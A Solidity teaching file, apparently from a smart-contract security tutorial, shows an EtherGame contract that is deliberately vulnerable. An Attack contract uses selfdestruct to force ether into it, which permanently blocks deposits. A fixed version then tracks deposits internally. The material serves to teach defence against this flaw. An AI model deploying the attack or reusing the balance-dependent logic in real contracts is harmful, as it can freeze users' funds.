// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// The goal of this game is to be the 7th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decide to play, deposit 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.
The reason is that the Attack contract sent ether to the Ethergame contract without calling the depositFunction.
Ethergame balance is 7 but only 2 players have entered.
If another player tries to enter the Game
They will call deposit with 1 ether
when they deposit 1 ether, the Ethergame balance will go up 1, and the balance is now 8
`
require(balance <= targetAmount, "Game is over");
`
according to our game balance should be <= targetAmount
8 <= 7 is false and it will revert.
Anyone who tries to enter the game will get this same revert.

The attacker broke the game.
No one can deposit and no one can become the winner

*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract EtherGame {
    uint public targetAmount = 3 ether;
    uint public balance;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        // instead of using `balance == address(this).balance`
        // We are keeping track of the balances in the `balance` variable.
        // Now if the attacker, sends eth without calling the `deposit` `balance` will not increase.
        balance += msg.value;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
